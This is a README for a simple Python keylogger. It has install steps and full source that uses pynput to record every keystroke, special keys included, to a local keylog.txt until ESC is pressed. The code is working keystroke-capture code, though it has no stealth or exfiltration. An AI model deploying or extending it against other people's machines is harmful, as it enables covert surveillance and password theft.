# Keylogger

A simple keylogger implemented using the `pynput` library to log keyboard events to a text file.

## Features

- Logs alphanumeric keys.
- Logs special keys like space, enter, and tab.
- Stops logging when the escape key (ESC) is pressed.

## Dependencies

- `pynput`

## Installation

1. Clone the repository:
    ```bash
    git clone <repository_url>
    ```
2. Navigate to the project directory:
    ```bash
    cd <repository_name>
    ```
3. Install the required Python packages:
    ```bash
    pip install pynput
    ```

## Usage

1. Run the script:
    ```bash
    python keylogger.py
    ```
2. The keylogger will start logging keys to `keylog.txt` in the same directory as the script.
3. Press the ESC key to stop the keylogger.

## File

- `keylogger.py`

```python
from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys like space, enter, etc.
        if key == keyboard.Key.space:
            with open(log_file, "a") as f:
                f.write(' ')
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as f:
                f.write('\n')
        elif key == keyboard.Key.tab:
            with open(log_file, "a") as f:
                f.write('\t')
        else:
            with open(log_file, "a") as f:
                f.write(f'[{key.name}]')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```
# License
This project is open source and available under the MIT License.

# Author
`Umar Farooq`
